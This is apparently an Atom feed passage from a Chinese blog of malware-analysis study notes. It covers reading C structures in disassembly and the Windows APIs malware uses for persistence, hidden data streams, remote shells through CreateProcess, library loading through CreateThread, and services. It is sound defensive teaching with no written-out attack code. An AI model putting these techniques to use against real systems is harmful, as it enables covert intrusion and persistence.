    <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    <category term="第二篇 静态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第6章 识别汇编中的C代码结构</title>
    <link href="https://kabeor.github.io/%E7%AC%AC6%E7%AB%A0%20%E8%AF%86%E5%88%AB%E6%B1%87%E7%BC%96%E4%B8%AD%E7%9A%84C%E4%BB%A3%E7%A0%81%E7%BB%93%E6%9E%84/"/>
    <id>https://kabeor.github.io/%E7%AC%AC6%E7%AB%A0%20%E8%AF%86%E5%88%AB%E6%B1%87%E7%BC%96%E4%B8%AD%E7%9A%84C%E4%BB%A3%E7%A0%81%E7%BB%93%E6%9E%84/</id>
    <published>2018-07-18T16:00:00.000Z</published>
    <updated>2020-03-16T04:24:21.689Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第6章-识别汇编中的C代码结构"><a href="#第6章-识别汇编中的C代码结构" class="headerlink" title="第6章 识别汇编中的C代码结构"></a>第6章 识别汇编中的C代码结构</h1><h2 id="6x1-全局与局部变量"><a href="#6x1-全局与局部变量" class="headerlink" title="6x1 全局与局部变量"></a>6x1 全局与局部变量</h2><blockquote><p>全局变量可以被一个程序中的任意函数访问和使用<br>局部变量只能在它被定义的函数中访问</p></blockquote><p>在反汇编代码中： </p><p><strong>全局变量通过内存地址引用</strong><br><strong>局部变量通过栈地址引用</strong></p><h2 id="6x2-反汇编算术操作"><a href="#6x2-反汇编算术操作" class="headerlink" title="6x2 反汇编算术操作"></a>6x2 反汇编算术操作</h2><blockquote><p><strong>C代码</strong></p></blockquote><p><a href="https://i.loli.net/2018/07/19/5b501f7218cec.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f7218cec.jpg" class="lazyload"></a></p><blockquote><p><strong>反汇编代码</strong></p></blockquote><p><a href="https://i.loli.net/2018/07/19/5b501f724a277.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f724a277.jpg" class="lazyload"></a></p><p>反汇编中，1<del>2行为赋值，3</del>5行为a=a+11，6<del>9行为a=a-b，10</del>12和13<del>15分别为a–和b++，16</del>19为b=a%3</p><h2 id="6x3-识别if语句"><a href="#6x3-识别if语句" class="headerlink" title="6x3 识别if语句"></a>6x3 识别if语句</h2><blockquote><p><strong>C代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f7260e22.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f7260e22.jpg" class="lazyload"></a></p></blockquote><blockquote><p><strong>反汇编代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f72760c1.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f72760c1.jpg" class="lazyload"></a></p></blockquote><p>cmp比较var_4是否等于var_8</p><h3 id="1-用IDA-Pro图形化分析函数"><a href="#1-用IDA-Pro图形化分析函数" class="headerlink" title="1. 用IDA Pro图形化分析函数"></a>1. 用IDA Pro图形化分析函数</h3><p><a href="https://i.loli.net/2018/07/19/5b501f72992fc.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f72992fc.jpg" class="lazyload"></a></p><h3 id="2-识别嵌套的if语句"><a href="#2-识别嵌套的if语句" class="headerlink" title="2. 识别嵌套的if语句"></a>2. 识别嵌套的if语句</h3><blockquote><p><strong>C代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f72ad72e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f72ad72e.jpg" class="lazyload"></a></p></blockquote><blockquote><p><strong>反汇编代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f72d0602.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f72d0602.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/19/5b501f72e9ab6.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f72e9ab6.jpg" class="lazyload"></a></p></blockquote><h2 id="6x4-识别循环"><a href="#6x4-识别循环" class="headerlink" title="6x4 识别循环"></a>6x4 识别循环</h2><h3 id="1-找到for循环"><a href="#1-找到for循环" class="headerlink" title="1. 找到for循环"></a>1. 找到for循环</h3><blockquote><p><strong>C代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f7312652.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f7312652.jpg" class="lazyload"></a></p></blockquote><blockquote><p><strong>反汇编代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f7381097.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f7381097.jpg" class="lazyload"></a></p></blockquote><blockquote><p><strong>IDA Pro图形化</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f86da225.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f86da225.jpg" class="lazyload"></a></p></blockquote><p>汇编代码中，for循环可通过以下4个组件识别出来</p><blockquote><p>初始化<br>比较<br>执行指令<br>递增/递减</p></blockquote><h3 id="2-找到while循环"><a href="#2-找到while循环" class="headerlink" title="2. 找到while循环"></a>2. 找到while循环</h3><blockquote><p><strong>C代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f8751178.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f8751178.jpg" class="lazyload"></a></p></blockquote><blockquote><p><strong>反汇编代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f8764b45.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f8764b45.jpg" class="lazyload"></a></p></blockquote><p>汇编代码和for循环非常相似，唯一区别在于它缺少一个递增</p><h2 id="6x5-理解函数调用约定"><a href="#6x5-理解函数调用约定" class="headerlink" title="6x5 理解函数调用约定"></a>6x5 理解函数调用约定</h2><blockquote><p><strong>一个函数调用的伪代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f8779503.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f8779503.jpg" class="lazyload"></a></p></blockquote><p>最常见的三个调用约定：cdecl，stdcall，fastcall</p><h3 id="1-cdecl"><a href="#1-cdecl" class="headerlink" title="1. cdecl"></a>1. cdecl</h3><p><a href="https://i.loli.net/2018/07/19/5b501f879153f.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f879153f.jpg" class="lazyload"></a></p><p>在cdecl约定中，参数从右到左按序被压入栈，当函数完成时由调用者清理栈。</p><h3 id="2-stdcall"><a href="#2-stdcall" class="headerlink" title="2. stdcall"></a>2. stdcall</h3><p>stdcall是Windows API的标准调用约定。任何调用这些API的代码都不需要清理栈，清理栈由实现API函数代码的DLL程序所承担</p><h3 id="3-fastcall"><a href="#3-fastcall" class="headerlink" title="3. fastcall"></a>3. fastcall</h3><p>在fastcall中，前面的一些参数被传到寄存器，备用的寄存器是EDX和ECX。如果需要，剩下的参数再以从右到左的次序被加载到栈上。<br>使用fastcall比其他约定更高效，因为代码不需要涉及过多的栈操作</p><h3 id="4-压栈与移动"><a href="#4-压栈与移动" class="headerlink" title="4. 压栈与移动"></a>4. 压栈与移动</h3><blockquote><p><strong>C代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f87a906f.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f87a906f.jpg" class="lazyload"></a></p></blockquote><blockquote><p><strong>adder函数汇编代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f87c20db.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f87c20db.jpg" class="lazyload"></a></p></blockquote><blockquote><p><strong>使用两种不同调用约定时一个函数调用的汇编代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f87d5f2a.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f87d5f2a.jpg" class="lazyload"></a></p></blockquote><h2 id="6x6-分析switch语句"><a href="#6x6-分析switch语句" class="headerlink" title="6x6 分析switch语句"></a>6x6 分析switch语句</h2><p>switch语句通常以两种方式被编译：</p><ol><li>if样式</li><li>跳转表</li></ol><h3 id="1-if样式"><a href="#1-if样式" class="headerlink" title="1. if样式"></a>1. if样式</h3><blockquote><p><strong>C代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f87e703c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f87e703c.jpg" class="lazyload"></a></p></blockquote><blockquote><p><strong>反汇编代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f880c31f.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f880c31f.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/19/5b501f9daa16e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f9daa16e.jpg" class="lazyload"></a></p></blockquote><blockquote><p><strong>IDA Pro图形化</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f9dd4356.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f9dd4356.jpg" class="lazyload"></a></p></blockquote><h3 id="2-跳转表"><a href="#2-跳转表" class="headerlink" title="2. 跳转表"></a>2. 跳转表</h3><blockquote><p><strong>C代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f9dece2d.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f9dece2d.jpg" class="lazyload"></a></p></blockquote><blockquote><p><strong>反汇编代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f9e12198.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f9e12198.jpg" class="lazyload"></a></p></blockquote><blockquote><p><strong>IDA Pro图形化</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f9e36c12.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f9e36c12.jpg" class="lazyload"></a></p></blockquote><h2 id="6x7-反汇编数组"><a href="#6x7-反汇编数组" class="headerlink" title="6x7 反汇编数组"></a>6x7 反汇编数组</h2><blockquote><p><strong>C代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f9e4d524.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f9e4d524.jpg" class="lazyload"></a></p></blockquote><blockquote><p><strong>反汇编代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f9e62590.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f9e62590.jpg" class="lazyload"></a></p></blockquote><p>数组a的基地址对应var_14，数组b的基地址对应dword_40A000.</p><p>ecx被作为索引使用，它被乘以4，来指明元素的大小，结果值与数组的基地址相加，来访问正确的数组元素。</p><h2 id="6x8-识别结构体"><a href="#6x8-识别结构体" class="headerlink" title="6x8 识别结构体"></a>6x8 识别结构体</h2><blockquote><p><strong>C代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f9e7869e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f9e7869e.jpg" class="lazyload"></a></p></blockquote><blockquote><p><strong>main函数反汇编代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f9e8ef54.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f9e8ef54.jpg" class="lazyload"></a></p></blockquote><blockquote><p><strong>test函数反汇编代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501f9ea93bc.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501f9ea93bc.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/19/5b501faf4c785.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501faf4c785.jpg" class="lazyload"></a></p></blockquote><p>arg_0是这个结构体的基地址，偏移0x14保存了结构中的字符，并且0x61对应ASCII中的字母a</p><h2 id="6x9-分析链表遍历"><a href="#6x9-分析链表遍历" class="headerlink" title="6x9 分析链表遍历"></a>6x9 分析链表遍历</h2><blockquote><p><strong>C代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501faf632ab.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501faf632ab.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/19/5b501faf7be8b.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501faf7be8b.jpg" class="lazyload"></a></p></blockquote><blockquote><p><strong>反汇编代码</strong></p><p><a href="https://i.loli.net/2018/07/19/5b501faf96083.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501faf96083.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/19/5b501fafb3fab.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501fafb3fab.jpg" class="lazyload"></a></p></blockquote><p>var_C对应i，它是这个循环的计数。<br>var_8对应head变量。<br>var_4是一个指向拥有两个被赋值变量结构体的指针</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第6章-识别汇编中的C代码结构&quot;&gt;&lt;a href=&quot;#第6章-识别汇编中的C代码结构&quot; class=&quot;headerlink&quot; title=&quot;第6章 识别汇编中的C代码结构&quot;&gt;&lt;/a&gt;第6章 识别汇编中的C代码结构&lt;/h1&gt;&lt;h2</summary>
        
      
    
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    <category term="第二篇 静态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第7章 分析恶意Windows程序</title>
    <link href="https://kabeor.github.io/%E7%AC%AC7%E7%AB%A0%20%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8FWindows%E7%A8%8B%E5%BA%8F/"/>
    <id>https://kabeor.github.io/%E7%AC%AC7%E7%AB%A0%20%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8FWindows%E7%A8%8B%E5%BA%8F/</id>
    <published>2018-07-18T16:00:00.000Z</published>
    <updated>2020-03-16T04:24:26.390Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第七章-分析恶意Windows程序"><a href="#第七章-分析恶意Windows程序" class="headerlink" title="第七章 分析恶意Windows程序"></a>第七章 分析恶意Windows程序</h1><h2 id="7x1-Windows-API"><a href="#7x1-Windows-API" class="headerlink" title="7x1 Windows API"></a>7x1 Windows API</h2><h3 id="1-类型和匈牙利表达法"><a href="#1-类型和匈牙利表达法" class="headerlink" title="1. 类型和匈牙利表达法"></a>1. 类型和匈牙利表达法</h3><p>Windows总体上使用匈牙利表达法作为API函数标识符，表达式使用前缀命名模式</p><blockquote><p>Windows API常见类型<br><a href="https://i.loli.net/2018/07/19/5b5020109dc75.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5020109dc75.jpg" class="lazyload"></a></p></blockquote><h3 id="2-句柄"><a href="#2-句柄" class="headerlink" title="2. 句柄"></a>2. 句柄</h3><p>句柄是在操作系统中被打开或被创建的项(一个窗口，进程，模块，菜单，文件等)<br>句柄不能用来做数学操作<br>我们所能做的只有保存它，并在后续函数调用中使用它来引用同一个对象</p><h3 id="3-文件系统函数"><a href="#3-文件系统函数" class="headerlink" title="3. 文件系统函数"></a>3. 文件系统函数</h3><p>恶意代码与系统交互的一个最常用的方式就是创建或修改文件<br>独特文件名或修改为既有文件名是明显的基于主机的感染迹象</p><blockquote><p>CreateFile</p></blockquote><p>用来创建和打开文件，可打开已存在的文件，管道，流，及I/O设备，能创建新文件</p><blockquote><p>ReadFile和WriteFile</p></blockquote><p>用来对文件进行读和写操作</p><blockquote><p>CreatFileMapping和MapViewOfFile</p></blockquote><p>从磁盘加载一个文件到内存和返回一个指向映射的基地址指针(可用来访问内存中的文件)</p><p><a href="https://i.loli.net/2018/07/19/5b502010b0ca7.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b502010b0ca7.jpg" class="lazyload"></a></p><h3 id="4-特殊文件"><a href="#4-特殊文件" class="headerlink" title="4. 特殊文件"></a>4. 特殊文件</h3><blockquote><p>共享文件</p></blockquote><p>以\serverName\share或\?\serverName\share开头命名的特殊文件，用来访问在共享目录中的目录或文件</p><blockquote><p>通过名字空间访问的文件</p></blockquote><p>名字空间可以被认为是固定数目的文件夹，每一个文件夹中保存不同类型的对象。底层的名字空间是NT名字空间，以前缀＼开始。NT名字空间可以访问所有设备，以及所有在NT名字空间中存在的其他名字空间。</p><p>以前缀\.\开始的Win32设备名字空间，经常被恶意代码用来直接访问物理设备，并且像一个文件一样进行读写操作</p><p>使用\Device\PhysicalMemory 来直接访问物理内存，这允许用户空间程序写到内核空间中。这个技术已经被恶意代码用来修改内核，并隐藏用户空间的程序。</p><blockquote><p>备用数据流</p></blockquote><p>备用数据流(ADS）特性允许附加数据被添加到一个已存在的NTFS文件中，相当于添加一 个文件到另外一 文件中。额外数据在列一 个目录时不会被显示出来，并且当显示文件内容时也不显示；而只有在你访问流时，它才是可见的。<br>ADS数据流根据约定normalFile.txt:Stream:$DATA来命名，这允许一个程序去读写一个流。恶意代码作者喜欢ADS，因为它能被用来隐藏数据。</p><h2 id="7x2-Windows注册表"><a href="#7x2-Windows注册表" class="headerlink" title="7x2 Windows注册表"></a>7x2 Windows注册表</h2><p>Windows注册表被用来保存操作系统与程序的配置信息<br><a href="https://i.loli.net/2018/07/19/5b502010c596d.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b502010c596d.jpg" class="lazyload"></a></p><h3 id="1-注册表根键"><a href="#1-注册表根键" class="headerlink" title="1. 注册表根键"></a>1. 注册表根键</h3><p><a href="https://i.loli.net/2018/07/19/5b502010de480.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b502010de480.jpg" class="lazyload"></a></p><h3 id="2-Regedit"><a href="#2-Regedit" class="headerlink" title="2. Regedit"></a>2. Regedit</h3><p>注册表编辑器，Windows内建的用来查看和编辑注册表的工具</p><h3 id="3-自启动程序"><a href="#3-自启动程序" class="headerlink" title="3. 自启动程序"></a>3. 自启动程序</h3><p>向Run子键中写入项，可设置程序自启动<br>Autoruns工具列举在操作系统启动时会自动启动运行的代码</p><h3 id="4-常用注册表函数"><a href="#4-常用注册表函数" class="headerlink" title="4. 常用注册表函数"></a>4. 常用注册表函数</h3><p><a href="https://i.loli.net/2018/07/19/5b50201101f17.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50201101f17.jpg" class="lazyload"></a></p><h3 id="5-练习分析注册表操作代码"><a href="#5-练习分析注册表操作代码" class="headerlink" title="5. 练习分析注册表操作代码"></a>5. 练习分析注册表操作代码</h3><h3 id="6-使用-reg文件的注册表脚本"><a href="#6-使用-reg文件的注册表脚本" class="headerlink" title="6. 使用.reg文件的注册表脚本"></a>6. 使用.reg文件的注册表脚本</h3><h2 id="7x3-网络API"><a href="#7x3-网络API" class="headerlink" title="7x3 网络API"></a>7x3 网络API</h2><h3 id="1-伯克利兼容套接字"><a href="#1-伯克利兼容套接字" class="headerlink" title="1. 伯克利兼容套接字"></a>1. 伯克利兼容套接字</h3><p>网络功能在Windows系统中由Winsock库实现，主要在ws2_32.dll中<br><a href="https://i.loli.net/2018/07/19/5b50201121de3.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50201121de3.jpg" class="lazyload"></a><br>WSAStartup函数必须在其他网络函数之前被调用<br>调试代码查找网络接口时，可在WSAStartup函数中设置断点</p><h3 id="2-网络的服务器和客户端"><a href="#2-网络的服务器和客户端" class="headerlink" title="2. 网络的服务器和客户端"></a>2. 网络的服务器和客户端</h3><p>一个网络程序通常有两个端点:服务器端，它维护一个打开套接字并等待入站连接：客户端，它连接到一个正在等待的套接字。而恶意代码可以是这两端中的任意一个。</p><h3 id="3-WinINet-API"><a href="#3-WinINet-API" class="headerlink" title="3. WinINet API"></a>3. WinINet API</h3><p><a href="https://i.loli.net/2018/07/19/5b50201135003.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50201135003.jpg" class="lazyload"></a></p><h2 id="7x4-跟踪恶意代码的运行"><a href="#7x4-跟踪恶意代码的运行" class="headerlink" title="7x4 跟踪恶意代码的运行"></a>7x4 跟踪恶意代码的运行</h2><h3 id="1-DLL"><a href="#1-DLL" class="headerlink" title="1. DLL"></a>1. DLL</h3><blockquote><p>动态链接库（DLL)是使用库来在多个应用程序之间共享代码的Windows特有方式。一个DLL程序是不能独自运行的可执行文件，但它可以导出一些被其他应用程序使用的函数。<br>被DLL程序使用的内存可以在正运行的进程之间共享。<br>在发布一个可执行文件时，你可以使用Windows系统上已 知的DLL程序，而无须去重新发布它们。这帮助软件开发者和恶意代码作者最小化发布软件的大小规模。<br>DLL程序也是一种有用的代码复用方式</p></blockquote><h4 id="恶意代码作者如何使用DLL"><a href="#恶意代码作者如何使用DLL" class="headerlink" title="恶意代码作者如何使用DLL"></a>恶意代码作者如何使用DLL</h4><blockquote><p>保存恶意代码<br>通过使用Windows DLL<br>通过使用第三方DLL</p></blockquote><h4 id="基本DLL结构"><a href="#基本DLL结构" class="headerlink" title="基本DLL结构"></a>基本DLL结构</h4><blockquote><p>DLL使用PE文件格式，并且只有一个单一标志，指示这个文件是一个<br>DLL,而不是一个.exeDLL经常有更多导出函数，并且通常导入函数较少。<br>DLL的主函数是DllMain。它没有标记，而且并不是一个DLL中的导出函数，但是它在PE头中被指定为文件的入口点。任何时候一个进程加载或卸载库，会创建一个新线程，或一个已程结束时，这个函数都会被调用来通知DLL。这个通知允许DLL来管理每个进程或每个线程的资源存在的线<br>程的资源。</p></blockquote><h3 id="2-进程"><a href="#2-进程" class="headerlink" title="2. 进程"></a>2. 进程</h3><h4 id="创建一个新进程"><a href="#创建一个新进程" class="headerlink" title="创建一个新进程"></a>创建一个新进程</h4><p>恶意代码最常使用的创建新进程函数是CreateProcess</p><blockquote><p>恶意代码通常使用C reateP rocess,来创建一个简单的远程shell- CreateProcess函数的一个参数，STARTUPINFO结构，包含一个进程的标准输入、标准输出以及标准错误流的句柄。一个恶意程序可以设置这些值为套接字，这样当这个程序写入标准输出时，它实际上会写到套接字上，因而允许一个攻击者执行远程shell,而不需要运行除CreateProcess之外的任何函数。</p></blockquote><h3 id="3-线程"><a href="#3-线程" class="headerlink" title="3. 线程"></a>3. 线程</h3><p>进程是执行代码的容器，线程才是Windows操作系统真正要执行的内容。线程是被CPU执行的独立指令序列，而不需要等待其他线程。一个进程包含一个或多个线程，它们执行进程中的一部分代码。一个进程中的所有线程共享同样的内存空间，但是每一个有它自己的处理器、寄存器和栈。</p><h4 id="线程上下文"><a href="#线程上下文" class="headerlink" title="线程上下文"></a>线程上下文</h4><blockquote><p>当一个线程运行时，它对CPU或CPU核有着完全的控制，并且其他线程不能影响CPU或核的状态。当一个线程改变CPU中某个寄存器的值时，它不会影响任何其他线程。一个操作系统在线程间切换之前，在CPU中的所有值会被保存到一个称为线程上下文的结构体中。然后操作系统加载这个线程上下文到一个新的线程中，并使这个新线程在CPU中执行</p></blockquote><h4 id="创建一个线程"><a href="#创建一个线程" class="headerlink" title="创建一个线程"></a>创建一个线程</h4><blockquote><p>CreateThread函数被用来创建一个新线程。函数的调用者指定一个起始地址，它经常被叫做sta rt函数。执行从这个起始地址开始直到这个函数返回，尽管这个函数不需要返回，这个线程可以在进程结束前一直运行。<br>CreateThread的调用者可以指定线程开始的函数位置，并且一个单一参数可以被传递给这个start函数。这个参数可以是任意值，依赖于这个线程要开始执行的函数。</p></blockquote><blockquote><p>• 恶意代码可以使用CreateThread,来加载一个新的恶意库文件到进程中，通过在调用CreateThread时将起始地址设置为Load Library的地址。 （传递给CreateThread的参数是要被加载库的名字。新的DLL被加载到这个进程的内存中，然后DllMain被调用。）<br>• 恶意代码可以为输入和输出创建两个线程：一个用来在套接字或管道上监听，并输出到一个进程的标准输入里，另一个用来从标准输出读取数据，并发送到套接字或管道上，恶意代码的目标是发送所有信息到单一的套接字或管道，来和运行的应用程序进行无缝通信。</p></blockquote><h3 id="4-使用互斥量的进程间协作"><a href="#4-使用互斥量的进程间协作" class="headerlink" title="4. 使用互斥量的进程间协作"></a>4. 使用互斥量的进程间协作</h3><blockquote><p>互斥量（mutex), 在内核中也称为互斥门（mutant)是全局对象，用于协调多个进程和线程。<br>互斥量主要用于控制共享资源的访问，并且经常被恶意代码所使用。<br>同一时刻，只有一个线程拥有一个互斥量。</p><p>线程通过一个对WaitForSingleObject的调用，获取对互斥量的访问，井且任何后续线程试图获取对它的访问时，都必须等待。当一个线程完成对互斥量的使用后，需要使用ReleaseMutex函数。</p></blockquote><blockquote><p>一个互斥量可以通过CreateMutex函数进行创建。而进程可以通过OpenMutex调用来获取另一个进程中互斥量的句柄。恶意代码通常创建一个互斥量，并试图使用同一个名字来打开一个已存在的互斥量，通过这种方式，可以确定恶意代码一次只有一个唯一实例在运行。</p></blockquote><h3 id="5-服务"><a href="#5-服务" class="headerlink" title="5. 服务"></a>5. 服务</h3><p>恶意代码执行附加代码的另一种方式是将它作为服务安装。Windows允许通过使用服务，来使任务作为后台应用程序运行，而不需要它们自己的进程或线程；代码被Windows服务管理器调度和运行，但没有用户输入。在Windows操作系统上的任何指定时间，都会有多个服务在运行。</p><p>服务也提供另一种在系统上维护持久化驻留的方式，因为它们可以被设置成当操作系统启动时 自动运行，并且可能甚至不在任务管理器中作为一个进程显示出来。一个用户查找所有运行的应用程序，也不会找到任何可疑的东西，因为恶意代码不是运行在一个独立进程中。</p><p>服务可以通过一些Windows API函数来进行安装和操作</p><blockquote><p>OpenSCManager： 